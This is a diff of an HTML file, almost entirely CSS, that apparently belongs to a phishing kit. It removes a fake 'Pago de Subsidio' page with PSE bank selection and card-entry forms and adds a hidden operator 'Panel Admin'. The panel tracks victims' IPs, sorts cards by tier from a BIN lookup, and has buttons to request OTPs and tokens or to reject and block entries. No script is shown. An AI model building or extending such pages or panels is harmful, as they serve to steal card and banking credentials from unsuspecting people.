@@ -1,1051 +1,1061 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>Pago de Subsidio - DTB</title>
-<link rel="icon" href="img/Logo-DTB-01.png" type="image/png">
-<script src="https://cdn.tailwindcss.com"></script>
-<script>
-tailwind.config = {
-  theme: {
-    extend: {
-      colors: { 'light-green': '#88f456', 'dark-green': '#00271c' },
-      fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
-    }
-  }
-}
-</script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Lato:wght@400;500;700;900&display=swap" rel="stylesheet">
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Panel Admin - PYP</title>
+<meta name="robots" content="noindex, nofollow, noarchive">
 <style>
-/* ============================================================
-   ANTI-ZOOM Y RESET
-   ============================================================ */
-html { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; -webkit-tap-highlight-color: transparent; }
-body { touch-action: manipulation; user-select: none; overscroll-behavior-y: none; font-family: 'Inter', system-ui, sans-serif; background: #f7f8fa; color: #00271c; }
-input, textarea, select { user-select: text; font-size: 16px !important; }
-button, a, .pay-method-card, .banco-card-pse { touch-action: manipulation; }
-*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-html { scroll-behavior: smooth; }
-img, svg { display: block; max-width: 100%; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0e1a; color: #e5e7eb; min-height: 100vh; font-size: 14px; }
+.hidden { display: none !important; }
+
+#loginScreen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; background: linear-gradient(135deg, #0a0e1a 0%, #1a1f35 100%); }
+.login-box { background: #151b2e; border: 1px solid #252d44; border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
+.login-box h1 { font-size: 24px; margin-bottom: 8px; color: #88f456; text-align: center; }
+.login-box p { text-align: center; color: #8b94a8; margin-bottom: 32px; font-size: 13px; }
+.login-box input { width: 100%; padding: 14px 16px; margin-bottom: 14px; background: #0f1421; border: 1px solid #252d44; border-radius: 10px; color: #e5e7eb; font-size: 15px; outline: none; transition: border-color 0.2s; }
+.login-box input:focus { border-color: #88f456; }
+.login-box button { width: 100%; padding: 14px; background: #88f456; color: #0a0e1a; border: none; border-radius: 10px; font-size: 15px; font-weight: 700; cursor: pointer; transition: all 0.2s; margin-top: 8px; }
+.login-box button:hover { background: #7ae045; }
+.login-box button:disabled { opacity: 0.5; cursor: not-allowed; }
+.login-error { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; padding: 10px 14px; border-radius: 8px; font-size: 13px; margin-bottom: 14px; }
+
+#dashboard { display: none; }
+#dashboard.visible { display: block; }
+
+.topbar { background: #151b2e; border-bottom: 1px solid #252d44; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; gap: 16px; flex-wrap: wrap; }
+.topbar-left { display: flex; align-items: center; gap: 20px; }
+.topbar h1 { font-size: 18px; color: #88f456; white-space: nowrap; }
+.tabs { display: flex; gap: 4px; }
+.tab-btn { background: transparent; border: none; color: #8b94a8; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
+.tab-btn:hover { background: #1a2035; color: #e5e7eb; }
+.tab-btn.active { background: #88f456; color: #0a0e1a; }
+.topbar-right { display: flex; align-items: center; gap: 12px; }
+.topbar-user { color: #8b94a8; font-size: 13px; }
+.topbar-user strong { color: #e5e7eb; }
+.btn-logout { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+.btn-logout:hover { background: #dc2626; }
+
+.container { max-width: 1600px; margin: 0 auto; padding: 20px; }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+.stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 20px; }
+.stat-card { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; }
+.stat-card .label { color: #8b94a8; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+.stat-card .value { font-size: 28px; font-weight: 700; color: #88f456; }
+.stat-card.pending .value { color: #fbbf24; }
+.stat-card.blocked .value { color: #ef4444; }
+.stat-card.sessions .value { color: #60a5fa; }
+
+.section { background: #151b2e; border: 1px solid #252d44; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+.section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #252d44; gap: 12px; flex-wrap: wrap; }
+.section-title { font-size: 15px; font-weight: 700; color: #e5e7eb; display: flex; align-items: center; gap: 8px; }
+.section-title .badge { background: #252d44; color: #88f456; font-size: 11px; padding: 3px 8px; border-radius: 12px; font-weight: 700; }
+.section-tools { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+.search-input { background: #0f1421; border: 1px solid #252d44; border-radius: 8px; padding: 8px 12px; color: #e5e7eb; font-size: 13px; outline: none; min-width: 200px; }
+.search-input:focus { border-color: #88f456; }
+.btn-borrar { background: #dc2626; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.15s; }
+.btn-borrar:hover { background: #b91c1c; }
+.btn-borrar:disabled { opacity: 0.4; cursor: not-allowed; }
+
+.table-wrap { overflow-x: auto; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+thead { background: #0f1421; }
+thead th { text-align: left; padding: 8px 10px; color: #8b94a8; font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #252d44; white-space: nowrap; }
+thead th.checkbox-col { width: 32px; text-align: center; }
+tbody tr { border-bottom: 1px solid #1a1f35; transition: background 0.15s; }
+tbody tr:hover { background: rgba(136, 244, 86, 0.04); }
+tbody td { padding: 10px; color: #cbd5e1; vertical-align: middle; }
+tbody td.checkbox-col { text-align: center; }
+tbody td.mono { font-family: 'Courier New', monospace; font-size: 11px; color: #88f456; }
+tbody td.ip { font-family: 'Courier New', monospace; color: #fbbf24; font-size: 11px; }
+tbody td.dato { font-family: 'Courier New', monospace; font-size: 11px; color: #cbd5e1; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-color: #88f456; }
+
+.empty { text-align: center; padding: 30px 20px; color: #6b7280; font-style: italic; font-size: 12px; }
+
+.actions { display: flex; gap: 4px; flex-wrap: nowrap; }
+.btn { padding: 5px 9px; border-radius: 6px; border: none; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 3px; }
+.btn-accept { background: #16a34a; color: white; }
+.btn-accept:hover { background: #15803d; }
+.btn-reject { background: #dc2626; color: white; }
+.btn-reject:hover { background: #b91c1c; }
+.btn-token { background: #3b82f6; color: white; }
+.btn-token:hover { background: #2563eb; }
+.btn-otp { background: #a855f7; color: white; }
+.btn-otp:hover { background: #9333ea; }
+.btn-final { background: #16a34a; color: white; }
+.btn-final:hover { background: #15803d; }
+.btn-block { background: #f59e0b; color: white; }
+.btn-block:hover { background: #d97706; }
+.btn-unblock { background: #3b82f6; color: white; }
+.btn-unblock:hover { background: #2563eb; }
+
+.estado { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700; text-transform: uppercase; white-space: nowrap; }
+.estado-pendiente { background: rgba(251, 191, 36, 0.15); color: #fbbf24; }
+.estado-aceptado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
+.estado-rechazado { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
+.estado-otp { background: rgba(168, 85, 247, 0.15); color: #a855f7; }
+.estado-token { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
+.estado-finalizado { background: rgba(34, 197, 94, 0.15); color: #22c55e; }
+.estado-cc_error { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
 
 /* ============================================================
-   PANTALLA DE CARGA INICIAL
+   BADGES DE NIVEL DE TARJETA (BIN LOOKUP)
    ============================================================ */
-#pantallaCargaInicial {
-  position: fixed; inset: 0; background: #fff; z-index: 9999999;
-  display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 24px;
-  transition: opacity .4s ease;
+.bin-nivel {
+    display: inline-block;
+    padding: 3px 9px;
+    border-radius: 5px;
+    font-size: 10px;
+    font-weight: 700;
+    text-transform: uppercase;
+    white-space: nowrap;
+    letter-spacing: 0.3px;
 }
-#pantallaCargaInicial.oculto { opacity: 0; pointer-events: none; }
-.spinner-carga {
-  width: 60px; height: 60px;
-  border: 5px solid #f3f3f3;
-  border-top: 5px solid #ff8c42;
-  border-radius: 50%;
-  animation: spinPago 1s linear infinite;
-}
-@keyframes spinPago { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
-.texto-carga { font-size: 16px; font-weight: 600; color: #00271c; text-align: center; line-height: 1.5; }
+.bin-nivel.platinum { background: linear-gradient(135deg, #6b7280, #374151); color: #e5e7eb; }
+.bin-nivel.gold { background: linear-gradient(135deg, #b45309, #f59e0b); color: #fffbeb; }
+.bin-nivel.silver { background: linear-gradient(135deg, #6b7280, #d1d5db); color: #1f2937; }
+.bin-nivel.black { background: linear-gradient(135deg, #000000, #374151); color: #fbbf24; }
+.bin-nivel.business { background: rgba(59, 130, 246, 0.2); color: #93c5fd; }
+.bin-nivel.signature { background: linear-gradient(135deg, #1e3a8a, #3b82f6); color: #ffffff; }
+.bin-nivel.infinite { background: linear-gradient(135deg, #1e1b4b, #7c3aed); color: #ffffff; }
+.bin-nivel.classic { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
+.bin-nivel.standard { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
+.bin-nivel.desconocido { background: rgba(107, 114, 128, 0.2); color: #9ca3af; }
 
-/* ============================================================
-   HEADER Y MAIN
-   ============================================================ */
-.navbar-custom { background: #ffa07a; padding: 10px 30px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
-.navbar-custom .logo-moviliza { height: 50px; width: auto; }
-.main-container { max-width: 900px; margin: 0 auto; padding: 32px 16px 60px; }
-
-/* ============================================================
-   RESUMEN
-   ============================================================ */
-.resumen-card { background: #fff; border: 1px solid #e5e5e5; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,.04); padding: 28px 32px; margin-bottom: 24px; border-left: 4px solid #1e6f24; font-family: 'Inter', Arial, Helvetica, sans-serif; }
-.resumen-titulo { font-size: 16px; font-weight: 700; color: #1e6f24; letter-spacing: .3px; margin-bottom: 22px; padding-bottom: 12px; border-bottom: 1px solid #eaeaea; }
-.resumen-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 18px 40px; margin-bottom: 22px; padding-bottom: 22px; border-bottom: 1px solid #eaeaea; }
-.dato-item { display: flex; flex-direction: column; gap: 4px; }
-.dato-lbl { font-size: 11px; font-weight: 600; color: #777; text-transform: uppercase; letter-spacing: .8px; }
-.dato-val { font-size: 15px; font-weight: 600; color: #222; word-break: break-word; }
-.resumen-desglose { display: flex; flex-direction: column; gap: 10px; }
-.desglose-row { display: flex; justify-content: space-between; align-items: center; font-size: 14px; color: #555; }
-.desglose-row.total { font-size: 20px; font-weight: 700; color: #1e6f24; padding-top: 14px; border-top: 1px solid #e0f7dd; margin-top: 6px; }
-.desglose-row .subsidio { color: #b45309; font-weight: 600; }
-.badge-subsidio { display: inline-block; background: #1e6f24; color: #fff; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 3px; letter-spacing: .5px; text-transform: uppercase; margin-left: 6px; }
-@media (max-width: 600px) { .resumen-grid { grid-template-columns: 1fr; } .resumen-card { padding: 22px 20px; } }
-
-/* ============================================================
-   SELECTOR MEDIO DE PAGO
-   ============================================================ */
-.selector-titulo { text-align: center; font-size: 18px; font-weight: 800; color: #00271c; margin-bottom: 20px; }
-.pay-method-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; max-width: 480px; margin: 0 auto; }
-.pay-method-card { position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; padding: 24px 16px; background: #fff; border: 2px solid #e3e8ee; border-radius: 16px; cursor: pointer; transition: all .2s ease; min-height: 170px; text-align: center; }
-.pay-method-card:hover { border-color: #cbd5e0; transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,.06); }
-.pay-method-card.selected { border-color: #88f456; background: #f4ffe9; box-shadow: 0 8px 24px rgba(136,244,86,.25); }
-.pay-method-card.selected .pay-method-check { opacity: 1; transform: scale(1); }
-.pay-method-check { position: absolute; top: 10px; right: 10px; width: 26px; height: 26px; border-radius: 50%; background: #88f456; display: flex; align-items: center; justify-content: center; opacity: 0; transform: scale(.5); transition: all .2s ease; }
-.pay-method-check svg { width: 16px; height: 16px; stroke: #00271c; stroke-width: 3; fill: none; }
-.pay-method-icon { width: 56px; height: 56px; display: flex; align-items: center; justify-content: center; color: #00271c; }
-.pay-method-icon img { max-width: 56px; max-height: 56px; object-fit: contain; }
-.pay-method-icon svg { width: 56px; height: 56px; }
-.pay-method-label { font-size: 14px; font-weight: 700; color: #00271c; line-height: 1.3; }
-.pay-method-sub { font-size: 11px; color: #6b7280; margin-top: 2px; }
-
-/* ============================================================
-   PSE Y MODAL BANCOS
-   ============================================================ */
-.pse-card { border: 1px solid #5469d4; border-radius: 8px; padding: 16px; background: #fff; box-shadow: 0 0 0 3px rgba(84,105,212,.12); }
-.pse-header { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; color: #1a1f36; padding-bottom: 16px; border-bottom: 1px solid #e3e8ee; margin-bottom: 20px; }
-.pse-logo { display: inline-flex; align-items: center; }
-.pse-logo-img { height: 32px; width: auto; object-fit: contain; display: block; }
-.banco-selector { width: 100%; height: 44px; padding: 0 12px; background: #fff; border: 1px solid #e3e8ee; border-radius: 6px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: border-color .15s, box-shadow .15s; font-size: 14px; color: #1a1f36; text-align: left; gap: 10px; }
-.banco-selector:hover { border-color: #cbd5e0; }
-.banco-selector:focus { outline: none; border-color: #5469d4; box-shadow: 0 0 0 3px rgba(84,105,212,.15); }
-.banco-selector-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
-.banco-logo-mini { width: 28px; height: 28px; object-fit: contain; flex-shrink: 0; display: none; }
-.banco-texto { font-size: 14px; color: #a3acb9; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-.banco-texto.seleccionado { color: #1a1f36; font-weight: 500; }
-.radio-group-pse { display: flex; gap: 12px; margin-top: 4px; }
-.radio-option-pse { flex: 1; display: flex; align-items: center; gap: 8px; padding: 10px 12px; border: 1px solid #e3e8ee; border-radius: 6px; cursor: pointer; transition: all .15s; background: #fff; }
-.radio-option-pse:hover { border-color: #cbd5e0; }
-.radio-option-pse:has(input:checked) { border-color: #5469d4; background: rgba(84,105,212,.04); }
-.radio-option-pse input { position: absolute; opacity: 0; width: 1px; height: 1px; }
-.radio-circle { flex-shrink: 0; width: 16px; height: 16px; border: 1.5px solid #cbd5e0; border-radius: 50%; background: #fff; position: relative; transition: all .15s; }
-.radio-option-pse input:checked + .radio-circle { border-color: #5469d4; }
-.radio-option-pse input:checked + .radio-circle::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 8px; height: 8px; border-radius: 50%; background: #5469d4; }
-.radio-option-pse input:checked ~ .radio-text-pse { color: #1a1f36; font-weight: 600; }
-.radio-text-pse { font-size: 13px; color: #3c4257; font-weight: 500; }
-.pse-hint { font-size: 12px; color: #697386; line-height: 1.5; margin-top: 16px; padding: 12px; background: #f6f8fa; border-radius: 6px; border-left: 3px solid #0f4c81; }
-.pse-hint strong { color: #1a1f36; font-weight: 600; }
-.mini-label-pse { display: block; font-size: 13px; font-weight: 500; color: #3c4257; margin-bottom: 6px; }
-
-.modal-banco { position: fixed; inset: 0; z-index: 999999 !important; display: flex; align-items: flex-end; justify-content: center; animation: fadeInModal .25s ease; }
-.modal-banco.hidden { display: none !important; }
-@keyframes fadeInModal { from { opacity: 0; } to { opacity: 1; } }
-.modal-banco-overlay { position: absolute; inset: 0; background: rgba(0,0,0,.5); backdrop-filter: blur(2px); -webkit-backdrop-filter: blur(2px); z-index: 1; }
-.modal-banco-content { position: relative; z-index: 2; width: 100%; max-width: 100%; max-height: 85vh; background: #fff; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 24px 20px 32px 20px; overflow-y: auto; animation: slideUpModal .3s cubic-bezier(.4,0,.2,1); box-shadow: 0 -8px 40px rgba(0,0,0,.15); display: flex; flex-direction: column; }
-@keyframes slideUpModal { from { transform: translateY(100%); } to { transform: translateY(0); } }
-.modal-banco-header { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; margin-bottom: 20px; }
-.modal-banco-title { font-size: 18px; font-weight: 700; color: #0d2a5c; line-height: 1.3; margin: 0; }
-.modal-banco-close { flex-shrink: 0; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: none; border: none; cursor: pointer; transition: background .15s; margin-top: -4px; }
-.modal-banco-close:hover { background: rgba(0,0,0,.05); }
-.modal-banco-search { position: relative; margin-bottom: 24px; }
-.modal-banco-search .search-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); pointer-events: none; }
-.banco-buscar-input { width: 100%; height: 48px; padding: 0 16px 0 48px; background: #f6f8fa; border: 1px solid #e3e8ee; border-radius: 12px; font-size: 15px; color: #1a1f36; outline: none; transition: border-color .15s, background .15s; }
-.banco-buscar-input::placeholder { color: #8a9099; }
-.banco-buscar-input:focus { background: #fff; border-color: #5469d4; box-shadow: 0 0 0 3px rgba(84,105,212,.15); }
-.modal-banco-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 12px; }
-.banco-card-pse { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; padding: 16px 8px 14px 8px; background: #f6f8fa; border: 1px solid transparent; border-radius: 12px; cursor: pointer; transition: all .15s; text-align: center; min-height: 110px; }
-.banco-card-pse:hover { background: #eef1f5; border-color: #d1d5db; transform: translateY(-1px); }
-.banco-card-pse.selected { background: #e8efff; border-color: #5469d4; }
-.banco-logo-wrap { width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-.banco-logo-wrap img { max-width: 44px; max-height: 44px; object-fit: contain; }
-.banco-nombre-pse { font-size: 12px; font-weight: 500; color: #1a1f36; line-height: 1.25; text-align: center; word-break: break-word; }
-.modal-banco-empty { text-align: center; padding: 40px 20px; color: #8a9099; font-size: 14px; }
-.modal-banco-empty.hidden { display: none; }
-@media (min-width: 500px) {
-  .modal-banco { align-items: center; }
-  .modal-banco-content { max-width: 520px; border-radius: 20px; max-height: 80vh; padding: 28px 28px 32px 28px; }
-}
-
-/* ============================================================
-   PANTALLA DE CARGA PSE
-   ============================================================ */
-.video-pse-overlay { position: fixed; inset: 0; width: 100%; height: 100%; background: #fafcf9; z-index: 9999999; margin: 0; padding: 0; overflow: hidden; align-items: center; justify-content: center; animation: fadeInVideo .3s ease; }
-.video-pse-overlay.hidden { display: none !important; }
-.video-pse-overlay:not(.hidden) { display: flex !important; }
-.pse-stage { width: min(100vw, calc(100vh * .5625)); height: min(100vh, calc(100vw * 1.7777778)); aspect-ratio: 9/16; position: relative; overflow: hidden; background: #fafcf9; font-family: 'Lato', Arial, sans-serif; }
-.pse-stage .pse-header { position: absolute; top: 0; left: 0; width: 100%; height: 12.1%; object-fit: contain; object-position: left center; display: block; }
-.pse-stage .pse-nombre { position: absolute; top: 25%; left: 50%; transform: translateX(-50%); margin: 0; padding: 0; text-align: center; font-size: 32px; font-weight: 900; line-height: 1.2; color: #0d2a5c; font-family: 'Lato', Arial, sans-serif; text-transform: uppercase; letter-spacing: .02em; z-index: 10; white-space: nowrap; max-width: 90%; overflow: hidden; text-overflow: ellipsis; }
-.pse-stage .pse-message { position: absolute; top: 30.6%; left: 5%; width: 90%; margin: 0; text-align: center; font-size: 26px; font-weight: 500; line-height: 1.35; color: #2a5490; font-family: 'Lato', Arial, sans-serif; }
-.pse-stage .pse-support { position: absolute; left: 4.8611%; bottom: 0; width: 91.6667%; height: 15.625%; object-fit: contain; object-position: center bottom; display: block; }
-@keyframes fadeInVideo { from { opacity: 0; } to { opacity: 1; } }
-@media (max-width: 768px) { .pse-stage .pse-nombre { font-size: 24px; } .pse-stage .pse-message { font-size: 20px; } }
-@media (max-width: 400px) { .pse-stage .pse-nombre { font-size: 20px; } .pse-stage .pse-message { font-size: 18px; } }
-
-/* ============================================================
-   MODAL TARJETA
-   ============================================================ */
-.tarjeta-modal { position: fixed; inset: 0; z-index: 9999999; display: flex; align-items: center; justify-content: center; padding: 16px; animation: fadeInTarjeta .25s ease; }
-.tarjeta-modal.hidden { display: none !important; }
-@keyframes fadeInTarjeta { from { opacity: 0; } to { opacity: 1; } }
-.tarjeta-modal-overlay { position: absolute; inset: 0; background: rgba(0,0,0,.7); backdrop-filter: blur(3px); -webkit-backdrop-filter: blur(3px); z-index: 1; }
-.tarjeta-modal-content { position: relative; z-index: 2; width: 100%; max-width: 1112px; max-height: 94vh; overflow-y: auto; background: #fff; border-radius: 20px; padding: 0; animation: zoomInTarjeta .3s cubic-bezier(.34,1.56,.64,1); box-shadow: 0 25px 60px rgba(0,0,0,.35); -webkit-overflow-scrolling: touch; }
-@keyframes zoomInTarjeta { from { opacity: 0; transform: scale(.9); } to { opacity: 1; transform: scale(1); } }
-.tarjeta-modal-close { position: absolute; top: 12px; right: 12px; z-index: 10; width: 36px; height: 36px; border-radius: 50%; background: #fff; border: 1px solid #e5e5e5; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 22px; color: #666; transition: all .15s; box-shadow: 0 2px 8px rgba(0,0,0,.08); }
-.tarjeta-modal-close:hover { background: #f0f0f0; color: #000; transform: scale(1.05); }
-
-.tarjeta-app { background: #fff; font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; font-size: 16px; line-height: 1.5; color: #16181e; border-radius: 20px; overflow: hidden; }
-.tarjeta-app * { margin: 0; padding: 0; box-sizing: border-box; }
-.tarjeta-app .app-wrapper { width: 100%; max-width: 1112px; margin: 0 auto; padding: 0; }
-@media (min-width: 768px) { .tarjeta-app .app-wrapper { width: 100%; padding: 0; } }
-
-.tarjeta-app .app { width: 100%; background: #fff; border-radius: 20px; border: 1px solid #eee; box-shadow: 0 3px 12px rgba(0,0,0,.1); display: flex; flex-direction: column; overflow: hidden; }
-@media (min-width: 768px) { .tarjeta-app .app { flex-direction: row; } }
-
-.tarjeta-app .merchant-section { padding: 32px; background: #f8fff8; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; }
-@media (min-width: 768px) { .tarjeta-app .merchant-section { width: 40%; border-radius: 20px 0 0 20px; } }
-@media (max-width: 767px) { .tarjeta-app .merchant-section { padding: 16px 16px 12px; border-radius: 0; height: auto; } }
-
-.tarjeta-app .header { display: flex; align-items: center; justify-content: flex-start; margin-bottom: 16px; width: 100%; }
-@media (max-width: 767px) { .tarjeta-app .header { justify-content: center; margin-bottom: 8px; } }
-.tarjeta-app .header .logo { max-width: 30px; height: auto; margin-top: 20px; }
-@media (max-width: 767px) { .tarjeta-app .header .logo { margin-top: 0; } }
-
-.tarjeta-app .price-panel { flex: 1; display: flex; flex-direction: column; justify-content: center; text-align: center; width: 100%; }
-.tarjeta-app .price-panel .merchant-label { font-family: 'Open Sans', sans-serif; font-size: 14px; line-height: 18px; letter-spacing: -.2px; color: #3c3c3c; font-weight: 400; margin-bottom: 4px; }
-.tarjeta-app .price-panel .merchant-name { font-size: 28px; line-height: 32px; letter-spacing: -.45px; font-weight: 700; color: #3c3c3c; margin-bottom: 12px; overflow: hidden; text-overflow: ellipsis; }
-@media (max-width: 767px) { .tarjeta-app .price-panel .merchant-name { font-size: 18px; line-height: 22px; margin-bottom: 8px; } }
-.tarjeta-app .price-panel .info-pill { display: inline-flex; align-items: center; justify-content: center; gap: 4px; padding: 4px 8px; border: 1px solid #2c2a29; border-radius: 25px; background: transparent; cursor: pointer; min-height: 26px; margin: 0 auto; }
-.tarjeta-app .price-panel .info-pill span { font-size: 14px; font-weight: 400; color: #3c3c3c; white-space: nowrap; }
-@media (max-width: 767px) { .tarjeta-app .price-panel .info-pill span { font-size: 12px; } }
-
-.tarjeta-app .content-section { flex: 1; padding: 32px 24px 24px; }
-@media (min-width: 768px) { .tarjeta-app .content-section { padding: 4rem 3rem 2rem 2rem; } }
-@media (max-width: 767px) { .tarjeta-app .content-section { padding: 1rem 1rem 1.5rem 1rem; } }
-
-.tarjeta-app .payment-method-badge { margin-bottom: 24px; }
-.tarjeta-app .payment-method-badge .title { font-size: 18px; font-weight: 700; color: #3c3c3c; line-height: 20px; letter-spacing: -.3px; margin-bottom: 16px; }
-@media (max-width: 767px) { .tarjeta-app .payment-method-badge .title { font-size: 16px; margin-bottom: 12px; } }
-.tarjeta-app .payment-method-badge .card { display: flex; align-items: center; gap: 12px; padding: 16px; border: 1px solid #7cb3dc; border-radius: 16px; background: #ebf6fe; margin-bottom: 8px; }
-.tarjeta-app .payment-method-badge .card .logo { width: 32px; height: 32px; flex-shrink: 0; }
-.tarjeta-app .payment-method-badge .card .logo svg { width: 100%; height: 100%; }
-.tarjeta-app .payment-method-badge .card .name { font-size: 16px; font-weight: 600; color: #3c3c3c; flex: 1; }
-@media (max-width: 767px) { .tarjeta-app .payment-method-badge .card .name { font-size: 14px; } }
-.tarjeta-app .payment-method-badge .card .brand-logos { display: flex; align-items: center; gap: 8px; }
-.tarjeta-app .payment-method-badge .change-link { background: none; border: none; color: #3c3c3c; text-decoration: underline; cursor: pointer; font-size: 14px; font-weight: 600; padding: 0; display: block; margin: 0 auto; text-align: center; }
-
-.tarjeta-app .intro { margin-bottom: 16px; }
-.tarjeta-app .intro-text { font-size: 16px; font-weight: 700; color: #2c2a29; }
-
-.tarjeta-app .input-group { margin-bottom: 18px; }
-.tarjeta-app .input-group label { display: block; font-size: 14px; font-weight: 400; color: #16181e; margin-bottom: 4px; }
-.tarjeta-app .input-group input, .tarjeta-app .input-group select { width: 100%; padding: 10px 14px; border: 1px solid #cacaca; border-radius: 6px; font-size: 16px; font-family: 'Open Sans', sans-serif; background: #fff; color: #16181e; transition: border-color .15s ease; appearance: none; -webkit-appearance: none; }
-.tarjeta-app .input-group input:focus, .tarjeta-app .input-group select:focus { border-color: #bbcef3; outline: none; }
-.tarjeta-app .input-group input::placeholder { color: #969696; }
-
-.tarjeta-app .card-input-wrapper { position: relative; display: flex; align-items: center; border: 1px solid #cacaca; border-radius: 6px; background: #fff; transition: border-color .15s ease; overflow: hidden; }
-.tarjeta-app .card-input-wrapper:focus-within { border-color: #bbcef3; }
-.tarjeta-app .card-input-wrapper input { width: 100%; padding: 10px 14px; border: none; border-radius: 6px; font-size: 16px; background: transparent; outline: none; min-width: 0; }
-
-.tarjeta-app .card-input-wrapper .card-logos { display: flex; gap: 8px; padding-right: 14px; flex-shrink: 0; align-items: center; transition: padding .3s ease; }
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item { display: flex; align-items: center; justify-content: center; width: 42px; height: 28px; overflow: hidden; transition: opacity .35s ease, transform .35s cubic-bezier(.34,1.56,.64,1), width .35s ease, margin .35s ease, padding .35s ease; opacity: 1; transform: scale(1); }
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item svg,
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item img { width: 42px; height: 28px; object-fit: contain; border-radius: 3px; flex-shrink: 0; }
-.tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto { opacity: 0; transform: scale(.4) rotate(-15deg); width: 0; margin-left: -8px; padding: 0; pointer-events: none; }
-.tarjeta-app .card-input-wrapper .card-logos.has-single { padding-right: 18px; }
-@media (max-width: 400px) {
-  .tarjeta-app .card-input-wrapper .card-logos { gap: 6px; padding-right: 10px; }
-  .tarjeta-app .card-input-wrapper .card-logos .card-logo-item,
-  .tarjeta-app .card-input-wrapper .card-logos .card-logo-item svg,
-  .tarjeta-app .card-input-wrapper .card-logos .card-logo-item img { width: 34px; height: 22px; }
-  .tarjeta-app .card-input-wrapper .card-logos.has-single { padding-right: 14px; }
-}
-
-.tarjeta-app .row { display: flex; gap: 16px; }
-.tarjeta-app .row .col { flex: 1; min-width: 0; }
-@media (max-width: 480px) { .tarjeta-app .row { flex-direction: column; gap: 0; } }
-
-.tarjeta-app .expiration-wrapper { display: flex; align-items: center; gap: 4px; }
-.tarjeta-app .expiration-wrapper select { flex: 1; padding: 10px 12px; border: 1px solid #cacaca; border-radius: 6px; font-size: 16px; background: #fff; appearance: none; -webkit-appearance: none; color: #969696; font-weight: 400; }
-.tarjeta-app .expiration-wrapper select:valid { color: #16181e; }
-
-.tarjeta-app .cvv-input { -webkit-text-security: disc; text-security: disc; }
-.tarjeta-app .cvv-wrapper { position: relative; }
